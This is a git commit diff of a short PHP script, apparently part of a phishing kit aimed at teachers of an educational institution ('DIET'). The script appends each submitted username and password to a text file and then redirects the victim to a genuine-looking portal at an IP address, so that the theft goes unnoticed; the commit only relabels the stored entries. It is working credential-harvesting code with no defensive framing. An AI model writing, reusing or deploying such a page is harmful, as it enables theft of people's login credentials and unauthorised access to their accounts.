313c5065b2dc5b71852d88d3197d05cad28a9c83
Sarisa Jaya Surya <107406629+suryasarisa99@users.noreply.github.com>
2024-02-04 19:27:41 +0530

    added parent.php

--- sites/diet/teacher.php
+++ sites/diet/teacher.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usernames.txt", "Teacher Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "DIET Teacher Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: http://103.138.0.69/ecap/');
 exit();
 ?>
